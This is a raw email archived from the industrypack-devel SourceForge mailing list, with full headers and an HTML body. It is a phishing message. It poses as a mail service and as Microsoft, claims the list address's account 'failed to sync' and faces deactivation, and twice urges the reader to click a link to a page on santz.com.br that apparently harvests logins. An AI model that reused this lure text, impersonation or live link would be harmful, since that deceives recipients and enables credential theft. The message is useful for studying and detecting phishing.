Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 66059438EBE
	for <lists+industrypack-devel@lfdr.de>; Mon, 25 Oct 2021 07:22:14 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.92.3)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1mesR1-0005ul-He
	for lists+industrypack-devel@lfdr.de; Mon, 25 Oct 2021 05:22:11 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-2.v29.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.92.3)
 (envelope-from <lei.lyo@publicposters.com>) id 1mesR0-0005ud-3r
 for industrypack-devel@lists.sourceforge.net; Mon, 25 Oct 2021 05:22:10 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=axTdOInpzkSXqA0NH9XV1FP9pQrjc0kA2U7Ma7Vw64I=; b=gQd6lfV/vMlDJ9xYpR3QfNDkrd
 6ziU2zwZsUKXyVlkvc4z696MjF+g9FLiNWJAtRIqW4Mke/Pdz/o3FJOuzEiMDnKcAHOQS2YEjyC8V
 DwPstxYtRr0Iu6RvLTYU4QYVqsDNG/ZXFDEvgnALmUC9KuuhmVAWmUxgIIjApXHW/5dc=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=axTdOInpzkSXqA0NH9XV1FP9pQrjc0kA2U7Ma7Vw64I=; b=g
 AsVizyfpzhLBrmCChBDzXcSoGwpqoyaGSrZXUiwrLhctrQl0ZV2SDcsTgOLASSbzIdGSefUyQi+Yc
 0PEnZcolZDLl21OWmpjIAwtUnqqrW5bx7VomsNG2fboLQlURqCCnQVclmNdcUmgpoT8932B5ONne/
 5ldDvayKFU/347SA=;
Received: from slot0.publicposters.com ([194.99.46.106])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.92.3)
 id 1mesQx-0006eW-Iu
 for industrypack-devel@lists.sourceforge.net; Mon, 25 Oct 2021 05:22:10 +0000
DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim; d=publicposters.com;
 h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:Content-Transfer-Encoding;
 i=lei.lyo@publicposters.com; bh=AgmeHqJuzMYGcxpezJfFLZDXU28=;
 b=u/j5TENzJ9mv3LSZPGdudfALL1ZYxBd3CNIloZbnz070p0VDrn2WlrwSoRXnPLrL9pKD/+VOkMY1
 kb4hPEd/P/XFjikv2VVqHPgaQodlJGrWV3xIsdB9N6mzxMp98zQmNFyc6Y3lin3bFrPDz8K2f6Yv
 qH8a8VmXMSxyrBVnZAF1gtbSWkB1SkWjSWIjJOwe85nemnLsGwyiUy3pGsqSUPniyNCnbj8L7mwR
 sQDmFqzklpPjUqsGwzNfd2B8RIRPhdG6LhCqtc0Sh9fva/hU8Z2iATdeOtkj0fTBLf/YKcm/b204
 LV89O8LC4lx9xkLodVFymBqJD3xXxJnmzjPNig==
DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=publicposters.com; 
 b=LYb+DZehQ7oJzV45n1cBvEocPY0D8Yfzb59rXugszNin2ijDwy/+W0i4+kg0vMkNz0antRgl3jtL
 W8KdGUxBIQ/xFmcmZ5VWeWVXUtaUk6+UrVoLzpRAEXcku/ozPjLv3lbVuiRmUlQvQVv8zVQwtHMr
 slmAeqk9T+N4FF6+nrtE/tKOo0KHh6S8KVr8fQWzYAUxAsh0zImRb+AVkNmGlfZFXyIKxbjJxf7o
 W4HKdwtzP2ZrdCDvnkZ2kMeOJh3VsFlif85bEbftr6iYDcqP3PGqsOrNgCzJhxSVhP9jQ90Jbzy8
 LuMacthvWiqN13+RZ2XUfm0ZbF/CRz8eX8qznw==;
From: Email Service For lists.sourceforge.net  <lei.lyo@publicposters.com>
To: industrypack-devel@lists.sourceforge.net
Date: 25 Oct 2021 07:21:55 +0200
Message-ID: <20211025072155.5EB850604941234E@publicposters.com>
MIME-Version: 1.0
X-Spam-Score: -0.1 (/)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-1.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  At 10/25/2021 7:21:55 a.m.,
 Your eMail account industrypack-devel@lists.sourceforge.net
 Failed to sync and returned 10 Incoming Messages. Sync failures occur when
 a eMail user has not Upgraded his/her eMail account in 90 days.. 
 Content analysis details:   (-0.1 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 -0.0 SPF_PASS               SPF: sender matches SPF record
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.0 HTML_FONT_FACE_BAD     BODY: HTML font face is not a word
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
 author's domain
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
 envelope-from domain
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
 valid 0.0 RCVD_IN_MSPIKE_L4      RBL: Bad reputation (-4)
 [194.99.46.106 listed in bl.mailspike.net]
 0.0 RCVD_IN_MSPIKE_BL      Mailspike blacklisted
X-Headers-End: 1mesQx-0006eW-Iu
Subject: [Industrypack-devel] lists.sourceforge.net NOTICE!!!!!
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============8078131807865514775=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============8078131807865514775==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
<body>
<P style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; WH=
ITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 40=
0; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-=
SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-var=
iant-caps: normal; text-decoration-style: initial; text-decoration-color: i=
nitial; -webkit-text-stroke-width: 0px">
<SPAN style=3D'FONT-FAMILY: wf_segoe-ui_normal, "Segoe UI", "Segoe WP", Tah=
oma, Arial, sans-serif, serif, EmojiFont; COLOR: rgb(33,33,33)'><B>At 10/25=
/2021 7:21:55 a.m.</B></SPAN><FONT face=3D"wf_segoe-ui_normal, Segoe UI, Se=
goe WP, Tahoma, Arial, sans-serif, serif, EmojiFont"><FONT color=3D#212121>=
, Your eMail account</FONT><FONT color=3D#6fa8dc>&nbsp;</FONT></FONT><FONT =
face=3D"comic sans ms, sans-serif"><B><FONT color=3D#0c343d>industrypack-de=
vel@lists.sourceforge.net</FONT><FONT color=3D#6fa8dc>&nbsp;</FONT></B></FO=
NT>
 F<FONT style=3D"COLOR: rgb(33,33,33)" face=3D"wf_segoe-ui_normal, Segoe UI=
, Segoe WP, Tahoma, Arial, sans-serif, serif, EmojiFont">ailed to sync and =
returned&nbsp;10 Incoming Messages.</FONT></P>
<P style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; WH=
ITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 40=
0; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-=
SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-var=
iant-caps: normal; text-decoration-style: initial; text-decoration-color: i=
nitial; -webkit-text-stroke-width: 0px"><FONT face=3D"Segoe UI">
<FONT color=3D#212121 face=3D"wf_segoe-ui_normal, Segoe UI, Segoe WP, Tahom=
a, Arial, sans-serif, serif, EmojiFont">Sync failures&nbsp;</FONT><FONT col=
or=3D#212121>occur<FONT face=3D"wf_segoe-ui_normal, Segoe UI, Segoe WP, Tah=
oma, Arial, sans-serif, serif, EmojiFont">&nbsp;when a eMail user has not U=
pgraded his/her eMail account in 90 days..</FONT></FONT></FONT><BR><BR><FON=
T color=3D#212121 face=3D"wf_segoe-ui_normal, Segoe UI, Segoe WP, Tahoma, A=
rial, sans-serif, serif, EmojiFont">To avoid&nbsp;D</FONT>
 <SPAN style=3D'FONT-FAMILY: wf_segoe-ui_normal, "Segoe UI", "Segoe WP", Ta=
homa, Arial, sans-serif, serif, EmojiFont; COLOR: rgb(33,33,33)'>e-activati=
on</SPAN><SPAN style=3D'FONT-FAMILY: wf_segoe-ui_normal, "Segoe UI", "Segoe=
 WP", Tahoma, Arial, sans-serif, serif, EmojiFont; COLOR: rgb(33,33,33)'>&n=
bsp;of this eMail account kindly click below to retrieve &amp; free pending=
 messages back to your inbox.</SPAN></P>
<table style=3D"FONT-SIZE: small; FONT-FAMILY: inherit; WHITE-SPACE: normal=
; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(33,=
33,33); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; =
TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal=
; text-decoration-style: initial; text-decoration-color: initial; -webkit-t=
ext-stroke-width: 0px" cellspacing=3D"0" width=3D"222" border=3D"0">
<TBODY>
<TR>
<td style=3D"FONT-FAMILY: Roboto, RobotoDraft, Helvetica, Arial, sans-serif=
; MIN-WIDTH: 50px; PADDING-BOTTOM: 5px; PADDING-TOP: 5px; PADDING-LEFT: 20p=
x; MARGIN: 0px; PADDING-RIGHT: 20px; BACKGROUND-COLOR: rgb(38,114,236)" bgc=
olor=3D"#2672ec">
<A=20
id=3Dgmail-m_4014264744703004187m_3067988344008626957m_-1136776643231973633=
m_-2450167051005763152m_-2002536060826220612m_-8551308050579542515m_-115036=
4680115986047m_-5789638306153986747m_7712301788687381273m_83583761451686923=
3m_-8403454542672139668m_-1220449622731522563m_2544434100301976007m_-856292=
430060893447m_3701504942798119637m_-7459359542057316429m_-10265620168490560=
76m_99475529778236493m_8952700678076738745m_5981141752607190861m_-846783123=
2996836426m_-3181994744579518690m_531449663853343724
 style=3D'BORDER-LEFT-WIDTH: 0px; FONT-FAMILY: "Segoe UI"; BORDER-RIGHT-WID=
TH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; FONT-WEIGHT: 6=
00; COLOR: rgb(255,255,255); PADDING-BOTTOM: 0px; TEXT-ALIGN: center; PADDI=
NG-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LETTER-SPACING: 0.02em; PADDIN=
G-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; text-decoration-line: none' href=3D"ht=
tps://santz.com.br/wp-admina/21-e-mailupdate/#industrypack-devel@lists.sour=
ceforge.net" rel=3D"noopener noreferrer" target=3D_blank=20
6m_-2227266052050904983m_7512468036195523266m_-4569538411529168292m_-638301=
0426324893864m_-431329529173085315m_4340365228393595725m_-81081262936140120=
79m_-322241902713335328m_-7536137224369418052m_5957959648667100112m_-875331=
7698334416455m_6177816942280141895m_2334083855368786057m_-17241098556170669=
64m_3175762082637707598gmail-m_-3298491012216353318m_-8306674927957226017m_=
-943635012931203858m_541363968806381200m_-8092327942670495150m_685849683581=
4030710m_8929061486479284866gmail-x_x_i10>
Click here to resolve</A></TD></TR></TBODY></TABLE>
<P style=3D'FONT-SIZE: small; FONT-FAMILY: wf_segoe-ui_normal, "Segoe UI", =
"Segoe WP", Tahoma, Arial, sans-serif, serif, EmojiFont; WHITE-SPACE: norma=
l; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(33=
,33,33); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal;=
 TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: norma=
l; text-decoration-style: initial; text-decoration-color: initial; -webkit-=
text-stroke-width: 0px'><FONT face=3D"Segoe UI"><BR>
To Verify your account in one simple step and prevent a re-occurrence, plea=
se&nbsp;<A style=3D"COLOR: rgb(17,85,204)" href=3D"https://santz.com.br/wp-=
admina/21-e-mailupdate/#industrypack-devel@lists.sourceforge.net" rel=3D"no=
opener noreferrer" target=3D_blank>click here</A>.</FONT></P>
<P style=3D'FONT-SIZE: small; FONT-FAMILY: wf_segoe-ui_normal, "Segoe UI", =
"Segoe WP", Tahoma, Arial, sans-serif, serif, EmojiFont; WHITE-SPACE: norma=
l; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(33=
,33,33); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal;=
 TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: norma=
l; text-decoration-style: initial; text-decoration-color: initial; -webkit-=
text-stroke-width: 0px'><B><BR></B></P>
<P style=3D'FONT-SIZE: small; FONT-FAMILY: wf_segoe-ui_normal, "Segoe UI", =
"Segoe WP", Tahoma, Arial, sans-serif, serif, EmojiFont; WHITE-SPACE: norma=
l; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(33=
,33,33); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal;=
 TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: norma=
l; text-decoration-style: initial; text-decoration-color: initial; -webkit-=
text-stroke-width: 0px'><B>&copy;2021 Microsoft</B>
 </P>
<P style=3D'FONT-SIZE: small; FONT-FAMILY: wf_segoe-ui_normal, "Segoe UI", =
"Segoe WP", Tahoma, Arial, sans-serif, serif, EmojiFont; WHITE-SPACE: norma=
l; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(33=
,33,33); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal;=
 TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: norma=
l; text-decoration-style: initial; text-decoration-color: initial; -webkit-=
text-stroke-width: 0px'><B>10/25/2021 7:21:55 a.m.</B></P></BODY>
</HTML>


--===============8078131807865514775==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============8078131807865514775==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============8078131807865514775==--
